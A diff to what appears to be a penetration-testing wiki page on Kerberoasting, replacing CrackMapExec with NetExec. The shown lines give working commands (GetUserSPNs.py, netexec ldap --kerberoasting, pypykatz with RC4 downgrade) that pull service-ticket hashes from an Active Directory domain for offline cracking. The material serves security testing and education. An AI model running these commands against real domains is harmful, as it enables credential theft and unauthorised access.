@@ -38,10 +38,10 @@ GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip $KeyDistributionCenter 'DO
 GetUserSPNs.py -outputfile kerberoastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
 ```
 
-This can also be achieved with [CrackMapExec](https://github.com/mpgn/CrackMapExec) (Python).
+This can also be achieved with [NetExec](https://github.com/Pennyw0rth/NetExec) (Python).
 
 ```bash
-crackmapexec ldap $TARGETS -u $USER -p $PASSWORD --kerberoasting kerberoastables.txt --kdcHost $KeyDistributionCenter
+netexec ldap $TARGETS -u $USER -p $PASSWORD --kerberoasting kerberoastables.txt --kdcHost $KeyDistributionCenter
 ```
 
 Using [pypykatz](https://github.com/skelsec/pypykatz/wiki/Kerberos-spnroast-command) (Python) it is possible to request an RC4 encrypted ST even when AES encryption is enabled (and if RC4 is still accepted of course). The tool features an -e flag which specifies what encryption type should be requested (default to 23, i.e. RC4). Trying to crack `$krb5tgs$23` takes less time than for `krb5tgs$18`.
